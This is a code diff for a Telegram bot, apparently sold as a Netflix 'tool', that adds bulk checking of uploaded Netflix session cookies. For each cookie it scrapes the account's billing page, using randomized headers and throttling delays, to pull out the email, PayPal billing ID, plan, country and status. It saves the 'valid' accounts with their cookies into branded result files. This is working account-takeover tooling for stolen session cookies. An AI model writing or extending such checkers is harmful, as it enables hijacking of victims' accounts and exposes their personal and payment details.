@@ -37,6 +37,8 @@ import time
 # from bs4 import BeautifulSoup
 from utils import extract_netflix_account_info, get_random_headers, fetch_netflix_service_code, convert_netscape_cookie_lines
 from telegram.ext import CallbackContext
+import random
+from bs4 import BeautifulSoup
 
 # Enable logging
 logging.basicConfig(
@@ -45,7 +47,7 @@ logging.basicConfig(
 logger = logging.getLogger(__name__)
 
 # --- State definitions for ConversationHandler ---
-CHOOSING, AWAIT_COOKIE_FILE, AWAIT_COMBINE_FILES, COLLECTING_COOKIE_FILES, AWAIT_FILTER_COOKIE, AWAIT_PAYPAL_BILLID, AWAIT_APPROVE_VALIDITY = range(7)
+CHOOSING, AWAIT_COOKIE_FILE, AWAIT_COMBINE_FILES, COLLECTING_COOKIE_FILES, COLLECTING_PAYPAL_FILES, AWAIT_FILTER_COOKIE, AWAIT_PAYPAL_BILLID, AWAIT_APPROVE_VALIDITY = range(8)
 
 # --- Keyboard Markups ---
 main_menu_keyboard = [
@@ -1168,131 +1170,377 @@ async def paypal_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
 
 async def request_paypal_billid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     logger.info("[Paypal Bill Id Finder] Prompting user for Netflix cookie.")
-    context.user_data['paypal_billid_cookie'] = None
+    context.user_data['paypal_files'] = []  # Initialize empty list for files
     await update.message.reply_text(
-        "Please send your Netflix cookie as a .txt file or paste the cookie string below.\n\nThis will be used to fetch your PayPal Billing ID.",
+        "Please send one or more `.txt` files OR paste your cookies as text.\n"
+        "Each cookie should be on a new line.\n\n"
+        "You can send multiple files or text, and when you're done, click the 'Done' button.",
+        reply_markup=cookie_collection_markup
+    )
+    return COLLECTING_PAYPAL_FILES
+
+async def collect_paypal_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    # Accept file or text
+    if update.message.document and update.message.document.file_name.endswith('.txt'):
+        file = await context.bot.get_file(update.message.document.file_id)
+        temp_file_path = tempfile.mktemp(suffix=".txt")
+        await file.download_to_drive(custom_path=temp_file_path)
+        file_name = update.message.document.file_name
+    elif update.message.text:
+        temp_file_path = tempfile.mktemp(suffix=".txt")
+        with open(temp_file_path, 'w', encoding='utf-8') as f:
+            f.write(update.message.text)
+        file_name = "cookie_from_text.txt"
+    else:
+        await update.message.reply_text(
+            "That doesn't look like a `.txt` file or valid text. Please try again.",
+            reply_markup=cookie_collection_markup
+        )
+        return COLLECTING_PAYPAL_FILES
+
+    if 'paypal_files' not in context.user_data:
+        context.user_data['paypal_files'] = []
+    context.user_data['paypal_files'].append({
+        'path': temp_file_path,
+        'name': file_name
+    })
+
+    file_count = len(context.user_data['paypal_files'])
+    await update.message.reply_text(
+        f"Added `{file_name}`. You've uploaded {file_count} file(s) so far.\n\n"
+        f"Send more files or click '✅ Done - Check All Cookies' when you're finished.",
+        parse_mode='Markdown',
+        reply_markup=cookie_collection_markup
+    )
+    return COLLECTING_PAYPAL_FILES
+
+async def process_paypal_files(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Process all collected files for PayPal information."""
+    if update.message.text == "❌ Cancel":
+        # Clean up temporary files
+        if 'paypal_files' in context.user_data:
+            for file_info in context.user_data['paypal_files']:
+                if os.path.exists(file_info['path']):
+                    os.remove(file_info['path'])
+            context.user_data['paypal_files'] = []
+        await update.message.reply_text("Operation cancelled.", reply_markup=main_menu_markup)
+        return CHOOSING
+
+    file_infos = context.user_data.get('paypal_files', [])
+    chat_id = update.effective_chat.id
+
+    if not file_infos:
+        await update.message.reply_text(
+            "You didn't send any files to check.",
+            reply_markup=main_menu_markup
+        )
+        return CHOOSING
+
+    # Show progress message
+    processing_msg = await update.message.reply_text(
+        f"Processing {len(file_infos)} files...",
         reply_markup=ReplyKeyboardRemove()
     )
-    return AWAIT_PAYPAL_BILLID
 
-async def handle_paypal_billid_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    logger.info("[Paypal Bill Id Finder] Received cookie input from user.")
-    try:
-        # Accept file or text
-        if update.message.document and update.message.document.file_name.endswith('.txt'):
-            file = await context.bot.get_file(update.message.document.file_id)
-            temp_file_path = tempfile.mktemp(suffix=".txt")
-            await file.download_to_drive(custom_path=temp_file_path)
-            with open(temp_file_path, 'r', encoding='utf-8', errors='ignore') as f:
-                raw_lines = f.readlines()
-                netscape_cookies = convert_netscape_cookie_lines(raw_lines)
-                if netscape_cookies:
-                    # Try each Netscape cookie until we find a valid one
-                    valid_cookie = None
-                    for cookie_str in netscape_cookies:
-                        parsed = extract_cookie_from_line(cookie_str)
-                        if parsed:
-                            valid_cookie = parsed
-                            break
-                    if valid_cookie:
-                        cookie_str = valid_cookie
-                    else:
-                        await update.message.reply_text("❌ No valid Netflix cookies found in Netscape format. Please check your file.")
-                        return AWAIT_PAYPAL_BILLID
-                else:
-                    cookie_str = ''.join(raw_lines).strip()
-            os.remove(temp_file_path)
-        elif update.message.text:
-            text_raw = update.message.text.strip()
-            netscape_cookies = convert_netscape_cookie_lines(text_raw.splitlines())
-            if netscape_cookies:
-                # Try each Netscape cookie until we find a valid one
-                valid_cookie = None
-                for cookie_str in netscape_cookies:
-                    parsed = extract_cookie_from_line(cookie_str)
-                    if parsed:
-                        valid_cookie = parsed
-                        break
-                if valid_cookie:
-                    cookie_str = valid_cookie
-                else:
-                    await update.message.reply_text("❌ No valid Netflix cookies found in Netscape format. Please check your input.")
-                    return AWAIT_PAYPAL_BILLID
-            else:
-                cookie_str = text_raw
-        else:
-            logger.warning("[Paypal Bill Id Finder] Invalid input: not a .txt file or text.")
-            await update.message.reply_text("That doesn't look like a .txt file or valid text. Please try again.")
-            return AWAIT_PAYPAL_BILLID
-
-        parsed_cookie = extract_cookie_from_line(cookie_str)
-        if not parsed_cookie:
-            logger.warning("[Paypal Bill Id Finder] Invalid cookie format.")
-            await update.message.reply_text("❌ Invalid cookie format. Please send a valid Netflix cookie (must contain both NetflixId and SecureNetflixId).\n\nExample: NetflixId=...; SecureNetflixId=...;")
-            return AWAIT_PAYPAL_BILLID
-
-        context.user_data['paypal_billid_cookie'] = parsed_cookie
-        loading_msg = await update.message.reply_text("⏳ Checking your account details, please wait...")
-        logger.info("[Paypal Bill Id Finder] Cookie validated. Fetching account info and billing activity.")
-
-        # Prepare cookies dict
-        cookies = {}
-        for part in parsed_cookie.strip().split(';'):
-            if '=' in part:
-                k, v = part.strip().split('=', 1)
-                cookies[k] = v
-        async with aiohttp.ClientSession(headers=get_random_headers()) as session:
-            async def fetch_page(url):
-                async with session.get(url, cookies=cookies, timeout=8) as resp:
-                    return await resp.text()
-            membership_url = 'https://www.netflix.com/account/membership'
-            security_url = 'https://www.netflix.com/account/security'
-            account_url = 'https://www.netflix.com/account'
-            billing_url = 'https://www.netflix.com/billingActivity'
-            tasks = [
-                fetch_page(membership_url),
-                fetch_page(security_url),
-                fetch_page(account_url),
-                fetch_page(billing_url),
-                fetch_netflix_service_code(session, cookies)
-            ]
-            membership_html, security_html, account_html, billing_html, service_code = await asyncio.gather(*tasks)
-
-        # Extract email using existing logic
-        info = extract_netflix_account_info(membership_html, security_html, account_html)
-        email = info.get('email')
-        logger.info(f"[Paypal Bill Id Finder] Extracted email: {email}")
-
-        # Extract PayPal Billing ID from billing_html
-        from bs4 import BeautifulSoup
-        soup = BeautifulSoup(billing_html, 'html.parser')
-        billing_id = None
-        for div in soup.find_all('div', {'data-uia': 'payment-details+details+PAYPAL'}):
-            span = div.find('span', {'data-uia': 'mopType'})
-            if span and span.text.strip().startswith('B-'):
-                billing_id = span.text.strip()
-                break
-        logger.info(f"[Paypal Bill Id Finder] Extracted Billing ID: {billing_id}")
-
-        # Prepare response
-        if email and billing_id:
-            msg = f"<b>PayPal Billing ID Finder Result</b>\n\n<b>Email:</b> <code>{email}</code>\n<b>PayPal Billing ID:</b> <code>{billing_id}</code>\n<b>Service Code:</b> <code>{service_code or '-'}</code>"
-        elif email:
-            msg = f"<b>PayPal Billing ID Finder Result</b>\n\n<b>Email:</b> <code>{email}</code>\n<b>PayPal Billing ID:</b> Not found (PayPal not used or not available)\n<b>Service Code:</b> <code>{service_code or '-'}</code>"
-        else:
-            msg = "❌ Could not extract email or PayPal Billing ID. Please check your cookie and try again."
-        await update.message.reply_html(msg)
+    # Combine all cookies
+    all_cookies = []
+    for file_info in file_infos:
         try:
-            await loading_msg.delete()
+            with open(file_info['path'], "r", encoding="utf-8", errors="ignore") as f:
+                cookies = [line.strip() for line in f if line.strip()]
+                netscape = convert_netscape_cookie_lines(cookies)
+                if netscape:
+                    all_cookies.extend(netscape)
+                else:
+                    all_cookies.extend(cookies)
+                logger.info(f"Added {len(cookies)} cookies from {file_info['name']}")
+        except Exception as e:
+            logger.error(f"Error reading file {file_info['path']}: {e}")
+
+    # Clean up temporary files
+    for file_info in file_infos:
+        if os.path.exists(file_info['path']):
+            os.remove(file_info['path'])
+    context.user_data['paypal_files'] = []
+
+    if not all_cookies:
+        await update.message.reply_text(
+            "No cookies found in the uploaded files.",
+            reply_markup=main_menu_markup
+        )
+        return CHOOSING
+
+    # Remove duplicates while preserving order
+    unique_cookies = []
+    seen = set()
+    for cookie in all_cookies:
+        if cookie not in seen:
+            seen.add(cookie)
+            unique_cookies.append(cookie)
+
+    found_msg = await update.message.reply_text(
+        f"Found {len(unique_cookies)} unique cookies from {len(file_infos)} files.\n"
+        "Starting PayPal information check..."
+    )
+
+    # Process cookies in batches
+    batch_size = 10
+    valid_results = []
+    invalid_results = []
+    
+    # Create timestamps for files
+    now = datetime.now()
+    file_timestamp = now.strftime("%Y%m%d_%H%M%S")
+    display_timestamp = now.strftime("%d %B %Y, %I:%M:%S %p")
+
+    # Create temporary placeholder files for results (will rename later when count known)
+    valid_filename = f"paypal_valid_{file_timestamp}.txt"
+    invalid_filename = f"paypal_invalid_{file_timestamp}.txt"
+    valid_temp_filepath = os.path.join(tempfile.gettempdir(), valid_filename)
+    invalid_temp_filepath = os.path.join(tempfile.gettempdir(), invalid_filename)
+
+    status_msg = await update.message.reply_text("🔍 Starting checks...")
+
+    async def process_cookie(cookie_str):
+        try:
+            parsed_cookie = extract_cookie_from_line(cookie_str)
+            if not parsed_cookie:
+                return None, (cookie_str, "Invalid cookie format")
+
+            cookies = {}
+            for part in parsed_cookie.strip().split(';'):
+                if '=' in part:
+                    k, v = part.strip().split('=', 1)
+                    cookies[k] = v
+
+            async with aiohttp.ClientSession(headers=get_random_headers()) as session:
+                async def fetch_page(url):
+                    async with session.get(url, cookies=cookies, timeout=8) as resp:
+                        return await resp.text()
+
+                try:
+                    billing_url = 'https://www.netflix.com/billingActivity'
+                    billing_html = await fetch_page(billing_url)
+                    service_code = await fetch_netflix_service_code(session, cookies)
+
+                    # --- Extract Email from embedded JSON ---
+                    def unescape(text: str | None):
+                        if not text:
+                            return None
+                        # Replace common escape sequences for spaces and @
+                        text = re.sub(r"\\x40|\\u0040", "@", text)
+                        # remove hex encoded spaces
+                        text = re.sub(r"\\x[0-9a-fA-F]{2}", " ", text)
+                        text = re.sub(r"\\u[0-9a-fA-F]{4}", " ", text)
+                        return text.strip()
+
+                    email_match = re.search(r'"emailAddress":"([^\"]+)"', billing_html)
+                    email = unescape(email_match.group(1)) if email_match else None
+
+                    status_match = re.search(r'"membershipStatus":"([^\"]+)"', billing_html)
+                    membership_status = unescape(status_match.group(1)) if status_match else None
+
+                    since_match = re.search(r'"memberSince":"([^\"]+)"', billing_html)
+                    member_since = unescape(since_match.group(1)) if since_match else None
+
+                    # Plan name & price extraction
+                    plan_tier = None
+                    price_formatted = None
+
+                    # First, try to get plan name from visible HTML (locale-independent):
+                    soup_preview = BeautifulSoup(billing_html, 'html.parser')
+                    plan_p = soup_preview.find('p', {'data-uia': 'plan-name-top-level'})
+                    if plan_p:
+                        plan_tier = plan_p.get_text(strip=True)
+                        # Price may follow as sibling text node
+                        sibling = plan_p.next_sibling
+                        if sibling and isinstance(sibling, str):
+                            price_formatted = sibling.strip()
+
+                    # Fallback to JSON displayName / priceFormatted if HTML parse failed
+                    if not plan_tier:
+                        name_match = re.search(r'"displayName":"([^\"]+)"', billing_html)
+                        plan_tier = unescape(name_match.group(1)) if name_match else None
+                    if not price_formatted:
+                        price_match = re.search(r'"priceFormatted":"([^\"]+)"', billing_html)
+                        price_formatted = unescape(price_match.group(1)) if price_match else None
+
+                    # --- Extract PayPal Billing ID via existing soup logic ---
+                    soup = BeautifulSoup(billing_html, 'html.parser')
+                    billing_id = None
+                    for div in soup.find_all('div', {'data-uia': 'payment-details+details+PAYPAL'}):
+                        span = div.find('span', {'data-uia': 'mopType'})
+                        if span and span.text.strip().startswith('B-'):
+                            billing_id = span.text.strip()
+                            break
+
+                    # Country (prefer currentCountry, fallback countryOfSignup)
+                    country_match = re.search(r'"currentCountry":"([^\"]+)"', billing_html)
+                    if not country_match:
+                        country_match = re.search(r'"countryOfSignup":"([^\"]+)"', billing_html)
+                    country = unescape(country_match.group(1)) if country_match else None
+
+                    if email and billing_id:
+                        result = {
+                            'email': email,
+                            'billing_id': billing_id,
+                            'service_code': service_code,
+                            'membership_status': membership_status,
+                            'member_since': member_since,
+                            'plan_tier': plan_tier,
+                            'price': price_formatted,
+                            'country': country,
+                            'cookie': cookie_str
+                        }
+                        return result, None
+                    else:
+                        missing = []
+                        if not email:
+                            missing.append('email')
+                        if not billing_id:
+                            missing.append('billing id')
+                        return None, (cookie_str, f"Missing {' & '.join(missing)}")
+
+                except Exception as e:
+                    return None, (cookie_str, f"Error checking account: {str(e)}")
+
+        except Exception as e:
+            return None, (cookie_str, f"Error processing cookie: {str(e)}")
+
+    # Process in batches
+    for i in range(0, len(unique_cookies), batch_size):
+        batch = unique_cookies[i:i + batch_size]
+        
+        # Update progress
+        progress = min(i + batch_size, len(unique_cookies))
+        try:
+            await status_msg.edit_text(
+                f"🔄 Progress: {progress}/{len(unique_cookies)} cookies checked\n"
+                f"✅ Valid: {len(valid_results)} | ❌ Invalid: {len(invalid_results)}"
+            )
         except Exception:
             pass
-        await update.message.reply_text("What would you like to do next?", reply_markup=main_menu_markup)
-        logger.info("[Paypal Bill Id Finder] Completed and replied to user.")
-        return CHOOSING
-    except Exception as e:
-        logger.error(f"[Paypal Bill Id Finder] Error: {e}")
-        await update.message.reply_text(f"❌ Error fetching PayPal Billing ID: {e}", reply_markup=main_menu_markup)
-        return ConversationHandler.END
+
+        # Process batch
+        tasks = [process_cookie(cookie) for cookie in batch]
+        results = await asyncio.gather(*tasks)
+
+        # Separate valid and invalid results
+        for result, error in results:
+            if result:
+                valid_results.append(result)
+            else:
+                invalid_results.append(error)
+
+        # Add delay between batches
+        if i + batch_size < len(unique_cookies):
+            await asyncio.sleep(random.uniform(1, 3))
+
+    # --- Save results to files (pretty format) ---
+    def format_pretty_card(res: dict) -> str:
+        """Return formatted string block for one valid PayPal account with extra details."""
+        email_txt = res['email']
+        # Base mandatory lines
+        lines = [
+            f"Email: {email_txt}",
+            f"PayPal Billing ID: {res['billing_id']}",
+            f"Service Code: {res['service_code']}"
+        ]
+
+        # Optional extras – append only if we have data
+        if res.get('plan_tier'):
+            price_txt = f" ({res['price']})" if res.get('price') else ""
+            lines.append(f"Plan: {res['plan_tier']}{price_txt}")
+        if res.get('member_since'):
+            lines.append(f"Member Since: {res['member_since']}")
+        if res.get('membership_status'):
+            lines.append(f"Status: {res['membership_status']}")
+        if res.get('country'):
+            lines.append(f"Country: {res['country']}")
+
+        # Compute layout width after gathering all lines
+        width = max(len(l) for l in lines)
+        border = "=" * (width + 4)
+        body = "Checked by @Netflix_tool_bot\n" + border + "\n"
+        for l in lines:
+            body += f"| {l.ljust(width)} |\n"
+        body += border + "\n\n"
+        body += "Contact For Any Type of Tools @knightownr\n\n"
+        body += f"Cookie: {res['cookie']}\n"
+        body += "-" * (width + 4) + "\n"
+        return body
+
+    with open(valid_temp_filepath, "w", encoding="utf-8") as f:
+        for result in valid_results:
+            f.write(format_pretty_card(result))
+
+    with open(invalid_temp_filepath, "w", encoding="utf-8") as f:
+        for cookie, reason in invalid_results:
+            f.write(f"Cookie: {cookie}\n")
+            f.write(f"Reason: {reason}\n")
+            f.write("-" * 50 + "\n")
+
+    # Send results
+    summary_msg = (
+        f"🔍 PayPal Billing ID Checker Results\n\n"
+        f"📝 Total Cookies: {len(unique_cookies)}\n"
+        f"✅ Valid PayPal: {len(valid_results)}\n"
+        f"❌ Invalid/Non-PayPal: {len(invalid_results)}\n"
+        f"📅 Date: {display_timestamp}"
+    )
+
+    await update.message.reply_text(summary_msg)
+
+    # Send result files
+    if valid_results:
+        with open(valid_temp_filepath, 'rb') as doc:
+            await context.bot.send_document(
+                chat_id=chat_id,
+                document=doc,
+                filename=valid_filename,
+                caption="✅ Valid PayPal Accounts"
+            )
+
+    if invalid_results:
+        with open(invalid_temp_filepath, 'rb') as doc:
+            await context.bot.send_document(
+                chat_id=chat_id,
+                document=doc,
+                filename=invalid_filename,
+                caption="❌ Invalid/Non-PayPal Accounts"
+            )
+
+    # Cleanup
+    try:
+        os.remove(valid_temp_filepath)
+        os.remove(invalid_temp_filepath)
+    except Exception:
+        pass
+
+    try:
+        await processing_msg.delete()
+        await found_msg.delete()
+        await status_msg.delete()
+    except Exception:
+        pass
+
+    await update.message.reply_text(
+        "PayPal checker finished. What would you like to do next?",
+        reply_markup=main_menu_markup
+    )
+    return CHOOSING
+
+    # --- Rename valid file to include account count ---
+    valid_count = len(valid_results)
+    new_valid_filename = f"paypal_valid_{valid_count}_ExtractedBy_@Netflix_tool_bot.txt"
+    new_valid_temp_filepath = os.path.join(tempfile.gettempdir(), new_valid_filename)
+    try:
+        os.rename(valid_temp_filepath, new_valid_temp_filepath)
+        valid_temp_filepath = new_valid_temp_filepath
+        valid_filename = new_valid_filename
+    except Exception:
+        # If rename fails, continue with original name
+        pass
 
 async def main() -> None:
     # Check if this is a restart
@@ -1351,9 +1599,9 @@ async def main() -> None:
                 MessageHandler(filters.Regex('^🍪 Cookie Checker$') & user_filter, request_cookie_file),
                 MessageHandler(filters.Regex('^🔎 Account Info$') & user_filter, request_filter_cookie),
                 MessageHandler(filters.Regex('💳 Paypal Bill Id Finder$') & user_filter, request_paypal_billid),
+                MessageHandler(filters.Regex('📒 Combine .TXT$') & user_filter, request_combine_files),
                 MessageHandler(filters.Regex('ℹ️ Help$') & user_filter, handle_main_menu_buttons),
                 MessageHandler(filters.COMMAND, handle_global_commands),
-                CommandHandler('refresh_bot', refresh_bot, filters=filters.User(ADMIN_USERS))
             ],
             COLLECTING_COOKIE_FILES: [
                 MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_cookie_files),
@@ -1361,14 +1609,19 @@ async def main() -> None:
                 MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                 MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
                 MessageHandler(filters.COMMAND, handle_global_commands),
-                CommandHandler('refresh_bot', refresh_bot, filters=filters.User(ADMIN_USERS))
+            ],
+            COLLECTING_PAYPAL_FILES: [
+                MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_paypal_files),
+                MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_paypal_files),
+                MessageHandler(filters.Document.TXT & user_filter, collect_paypal_files),
+                MessageHandler(filters.TEXT & user_filter, collect_paypal_files),
+                MessageHandler(filters.COMMAND, handle_global_commands),
             ],
             AWAIT_COMBINE_FILES: [
                 MessageHandler(filters.Regex('^✅ Done Combining$') & user_filter, process_combined_files),
                 MessageHandler(filters.Document.TXT & user_filter, handle_combine_files),
                 MessageHandler(filters.TEXT & user_filter, handle_combine_files),
                 MessageHandler(filters.COMMAND, handle_global_commands),
-                CommandHandler('refresh_bot', refresh_bot, filters=filters.User(ADMIN_USERS))
             ],
             AWAIT_FILTER_COOKIE: [
                 MessageHandler(filters.Document.TXT & user_filter, handle_filter_cookie),
@@ -1458,6 +1711,11 @@ async def main() -> None:
     # Add this in main() after other admin command handlers
     application.add_handler(CommandHandler("refresh_bot", refresh_bot, filters=filters.User(ADMIN_USERS)), group=-1)
 
+# --- Compatibility stub (to avoid NameError) ---
+async def handle_paypal_billid_cookie(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
+    """Deprecated handler kept for backward compatibility. Redirects to new bulk PayPal flow."""
+    return await collect_paypal_files(update, context)
+
 if __name__ == "__main__":
     import os
     import asyncio
@@ -1491,6 +1749,13 @@ if __name__ == "__main__":
                     MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                     MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
+                ],
+                COLLECTING_PAYPAL_FILES: [
+                    MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_paypal_files),
+                    MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_paypal_files),
+                    MessageHandler(filters.Document.TXT & user_filter, collect_paypal_files),
+                    MessageHandler(filters.TEXT & user_filter, collect_paypal_files),
                     MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_COMBINE_FILES: [
@@ -1550,6 +1815,13 @@ if __name__ == "__main__":
                     MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_cookie_files),
                     MessageHandler(filters.Document.TXT & user_filter, collect_cookie_file),
                     MessageHandler(filters.TEXT & user_filter, collect_cookie_file),
+                    MessageHandler(filters.COMMAND, handle_global_commands),
+                ],
+                COLLECTING_PAYPAL_FILES: [
+                    MessageHandler(filters.Regex('^✅ Done - Check All Cookies$') & user_filter, process_paypal_files),
+                    MessageHandler(filters.Regex('^❌ Cancel$') & user_filter, process_paypal_files),
+                    MessageHandler(filters.Document.TXT & user_filter, collect_paypal_files),
+                    MessageHandler(filters.TEXT & user_filter, collect_paypal_files),
                     MessageHandler(filters.COMMAND, handle_global_commands),
                 ],
                 AWAIT_COMBINE_FILES: [
